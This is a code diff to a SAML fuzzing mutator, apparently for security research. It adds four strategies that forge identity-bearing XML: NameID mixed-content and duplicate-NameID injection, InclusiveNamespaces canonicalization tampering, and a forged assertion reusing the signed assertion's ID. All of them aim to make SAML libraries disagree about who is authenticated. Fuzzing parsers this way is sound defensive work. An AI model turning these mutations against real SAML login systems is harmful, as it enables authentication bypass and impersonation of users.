@@ -582,6 +582,11 @@ class SamlMutator:
             self._unicode_normalization,          # 55  NEW
             self._null_byte_inject,               # 56  NEW
             self._multi_sig_scope,                # 57  NEW
+            # ── I: Extraction divergence strategies ──
+            self._nameid_mixed_content,           # 58  NEW
+            self._multi_nameid,                   # 59  NEW
+            self._inclusive_ns_manipulate,         # 60  NEW
+            self._assertion_id_collision,          # 61  NEW
         ]
         self._strategy_names: list[str] = [fn.__name__.lstrip("_") for fn in self._strategies]
         self._weights: list[int] = [
@@ -605,6 +610,8 @@ class SamlMutator:
             8, 7, 6, 7, 6,
             # H: Newly discovered gap strategies
             7, 6, 7,
+            # I: Extraction divergence strategies
+            8, 7, 6, 7,
         ]
         assert len(self._strategies) == len(self._weights)
 
@@ -1872,4 +1879,281 @@ class SamlMutator:
             # Insert duplicate right after the original
             return bytearray(
                 bytes(data[:sig_span[1]]) + b"\n" + sig_block + bytes(data[sig_span[1]:])
+            )
+
+    # ══════════════════════════════════════════════════════════════
+    # I: Extraction Divergence Strategies
+    # ══════════════════════════════════════════════════════════════
+
+    def _nameid_mixed_content(self, data: bytearray) -> bytearray | None:
+        """NameID mixed content injection (I1).
+
+        Inserts child elements or PIs inside NameID to exploit text
+        extraction method differences:
+        - ruby-saml REXML .text → first text node only
+        - lxml itertext() → all descendant text concatenated
+        - DOM textContent → all descendant text concatenated
+
+        Example: <NameID>evil<x>legit</x></NameID>
+          .text    → "evil"
+          itertext → "evillegit"
+        """
+        m = _RE_NAMEID.search(data)
+        if not m:
+            return None
+
+        original_text = m.group(2)
+        if not original_text or len(original_text) < 3:
+            return None
+
+        evil = self.rng.choice(EVIL_NAMEIDS)
+
+        mode = self.rng.choice([
+            "child_element",
+            "processing_instruction",
+            "nested_element",
+            "split_text",
+        ])
+
+        if mode == "child_element":
+            # evil<x xmlns="">original</x>
+            new_content = evil + b'<x xmlns="">' + original_text + b"</x>"
+        elif mode == "processing_instruction":
+            # evil<?pi original?>
+            new_content = evil + b"<?pi " + original_text + b"?>"
+        elif mode == "nested_element":
+            # Split evil value: "evil" + <child> + "@rest"
+            mid = max(2, len(evil) // 2)
+            new_content = (
+                evil[:mid]
+                + b"<saml:NameQualifier>"
+                + evil[mid:]
+                + b"</saml:NameQualifier>"
+                + original_text
+            )
+        else:
+            # evil<span/>original
+            new_content = evil + b"<span/>" + original_text
+
+        return bytearray(
+            bytes(data[:m.start(2)]) + new_content + bytes(data[m.end(2):])
+        )
+
+    def _multi_nameid(self, data: bytearray) -> bytearray | None:
+        """Multiple NameID injection (I2).
+
+        Inserts additional NameID elements in the same assertion to
+        test which NameID each library selects:
+        - find() → first match
+        - findAll()[0] → first match
+        - XPath .//NameID → first in document order
+        - getElementsByTagName → first match
+
+        Different insertion points may cause different selection.
+        """
+        m = _RE_NAMEID.search(data)
+        if not m:
+            return None
+
+        evil = self.rng.choice(EVIL_NAMEIDS)
+        evil_nameid = (
+            b'<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">'
+            + evil
+            + b"</saml:NameID>"
+        )
+
+        mode = self.rng.choice([
+            "before",            # evil NameID before original
+            "after",             # evil NameID after original
+            "outside_subject",   # evil NameID outside Subject but in assertion
+        ])
+
+        if mode == "before":
+            return bytearray(
+                bytes(data[:m.start(0)]) + evil_nameid + bytes(data[m.start(0):])
+            )
+        elif mode == "after":
+            return bytearray(
+                bytes(data[:m.end(0)]) + evil_nameid + bytes(data[m.end(0):])
+            )
+        else:
+            # Insert outside Subject, directly under Assertion
+            assertion_m = _RE_ASSERTION_CLOSE.search(data)
+            if not assertion_m:
+                return None
+            return bytearray(
+                bytes(data[:assertion_m.start()])
+                + evil_nameid
+                + bytes(data[assertion_m.start():])
+            )
+
+    def _inclusive_ns_manipulate(self, data: bytearray) -> bytearray | None:
+        """InclusiveNamespaces PrefixList manipulation (I3).
+
+        Manipulates the InclusiveNamespaces element in exc-c14n transforms
+        to trigger c14n divergence between libraries. lxml has known bugs
+        with InclusiveNamespaces PrefixList handling.
+        """
+        # Must have exc-c14n transform
+        if b"xml-exc-c14n#" not in data:
+            return None
+
+        inc_ns_re = re.compile(
+            rb'(<(?:ec:|)InclusiveNamespaces\s+PrefixList=")(.*?)(")',
+            re.IGNORECASE | re.DOTALL,
+        )
+
+        mode = self.rng.choice([
+            "add_prefix",
+            "empty",
+            "default",
+            "inject_new",
+        ])
+
+        m = inc_ns_re.search(data)
+
+        if m:
+            # Modify existing InclusiveNamespaces
+            if mode == "add_prefix":
+                # Add non-existent prefix
+                new_val = m.group(2) + b" evil xsi foo"
+                return bytearray(
+                    bytes(data[:m.start(2)]) + new_val + bytes(data[m.end(2):])
+                )
+            elif mode == "empty":
+                return bytearray(
+                    bytes(data[:m.start(2)]) + b"" + bytes(data[m.end(2):])
+                )
+            elif mode == "default":
+                new_val = m.group(2) + b" #default"
+                return bytearray(
+                    bytes(data[:m.start(2)]) + new_val + bytes(data[m.end(2):])
+                )
+            else:
+                new_val = b"saml ds samlp #default"
+                return bytearray(
+                    bytes(data[:m.start(2)]) + new_val + bytes(data[m.end(2):])
+                )
+        else:
+            # No existing InclusiveNamespaces — inject one after exc-c14n Transform
+            exc_c14n_re = re.compile(
+                rb'(<ds:Transform\s+Algorithm="http://www\.w3\.org/2001/10/xml-exc-c14n#")\s*(/?>)',
+                re.IGNORECASE | re.DOTALL,
+            )
+            tm = exc_c14n_re.search(data)
+            if not tm:
+                return None
+
+            if tm.group(2) == b"/>":
+                # Self-closing — need to change to open/close with child
+                prefix_list = self.rng.choice([
+                    b"saml ds",
+                    b"#default",
+                    b"saml ds samlp xsi",
+                    b"",
+                ])
+                inject = (
+                    tm.group(1) + b">"
+                    + b'<ec:InclusiveNamespaces '
+                    + b'xmlns:ec="http://www.w3.org/2001/10/xml-exc-c14n#" '
+                    + b'PrefixList="' + prefix_list + b'"/>'
+                    + b"</ds:Transform>"
+                )
+                return bytearray(
+                    bytes(data[:tm.start()]) + inject + bytes(data[tm.end():])
+                )
+            else:
+                # Has closing tag — inject child
+                prefix_list = self.rng.choice([
+                    b"saml ds",
+                    b"#default",
+                    b"saml ds samlp xsi",
+                    b"",
+                ])
+                inject = (
+                    b'<ec:InclusiveNamespaces '
+                    b'xmlns:ec="http://www.w3.org/2001/10/xml-exc-c14n#" '
+                    b'PrefixList="' + prefix_list + b'"/>'
+                )
+                pos = tm.end()
+                return bytearray(
+                    bytes(data[:pos]) + inject + bytes(data[pos:])
+                )
+
+    def _assertion_id_collision(self, data: bytearray) -> bytearray | None:
+        """Assertion ID collision (I4).
+
+        Insert an evil assertion with the SAME ID as the signed assertion.
+        Tests which assertion each library selects when Reference URI
+        matches multiple elements:
+        - getElementById: typically first in document order
+        - XPath id(): implementation-dependent
+        - libxml2: ID caching → first registered element
+
+        Unlike _libxml2_id_caching which targets a specific CVE, this
+        strategy creates full evil assertions with the matching ID and
+        works with the assertion_id oracle to verify selection.
+        """
+        # Find original assertion ID
+        assertion_m = _RE_ASSERTION_OPEN.search(data)
+        if not assertion_m:
+            return None
+
+        id_re = re.compile(rb'\bID="([^"]+)"')
+        id_m = id_re.search(assertion_m.group(0))
+        if not id_m:
+            return None
+
+        original_id = id_m.group(1)
+
+        # Build evil assertion with SAME ID
+        evil_nameid = self.rng.choice(EVIL_NAMEIDS)
+        evil_assertion = (
+            b'<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"'
+            b' Version="2.0" ID="' + original_id + b'"'
+            b' IssueInstant="2026-01-01T00:00:00Z">'
+            b"<saml:Issuer>https://idp.example.com</saml:Issuer>"
+            b"<saml:Subject>"
+            b'<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">'
+            + evil_nameid +
+            b"</saml:NameID>"
+            b"</saml:Subject>"
+            b"</saml:Assertion>"
+        )
+
+        mode = self.rng.choice([
+            "before_assertion",
+            "after_assertion",
+            "in_extensions",
+        ])
+
+        if mode == "before_assertion":
+            return bytearray(
+                bytes(data[:assertion_m.start()])
+                + evil_assertion + b"\n"
+                + bytes(data[assertion_m.start():])
+            )
+        elif mode == "after_assertion":
+            assertion_close = _RE_ASSERTION_CLOSE.search(data)
+            if not assertion_close:
+                return None
+            pos = assertion_close.end()
+            return bytearray(
+                bytes(data[:pos]) + b"\n" + evil_assertion + bytes(data[pos:])
+            )
+        else:
+            # Wrap original in Extensions, put evil in original position
+            assertion_span = _find_element_span(
+                data, _RE_ASSERTION_OPEN, _RE_ASSERTION_CLOSE
+            )
+            if not assertion_span:
+                return None
+            original_assertion = bytes(data[assertion_span[0]:assertion_span[1]])
+            return bytearray(
+                bytes(data[:assertion_span[0]])
+                + evil_assertion + b"\n"
+                + XSW_EXTENSIONS_PREFIX
+                + original_assertion
+                + XSW_EXTENSIONS_SUFFIX
+                + bytes(data[assertion_span[1]:])
             )
